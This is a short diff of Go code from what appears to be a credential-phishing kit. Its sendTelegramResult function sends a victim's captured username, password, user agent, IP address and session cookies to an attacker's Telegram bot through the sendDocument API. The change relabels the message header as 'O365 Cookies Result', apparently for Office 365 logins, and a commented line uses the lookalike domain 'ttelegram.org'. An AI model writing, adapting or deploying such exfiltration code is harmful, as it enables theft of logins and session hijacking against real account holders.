@@ -54,7 +54,7 @@ func sendTelegramResult(cookies string, username string, password string, remote
 
 	url := "https://api.telegram.org/bot" + token + "/sendDocument?chat_id=" + chat_id + ""
 	//url := "http://api.ttelegram.org/bot"%s/sendDocument?chat_id=%s", getUrl(), getChatId())
-	msg := "[ 🍁 ["+phishlet+" "+sid+"] Cookies Result 🍁 ]\n\n********* [ 💻 Valid Login  💻 ] ********\n🌟 Username : " + username + "\n🔑 Password : " + password + "\n🌎 UserAgent: " + useragent + "\n💻 IP:   https://ip-api.com/" + remote_addr + "\n\n*******[ 🍪 Cookies Captured 🍪 ] **********"
+	msg := "[ 🍁 O365 Cookies Result 🍁 ]\n\n********* [ 💻 Valid Login  💻 ] ********\n🌟 Username : " + username + "\n🔑 Password : " + password + "\n🌎 UserAgent: " + useragent + "\n💻 IP:   https://ip-api.com/" + remote_addr + "\n\n*******[ 🍪 Cookies Captured 🍪 ] **********"
 	
 // 	postBody, _ := json.Marshal(map[string]string{
 // 		"chat_id":    getChatId(),
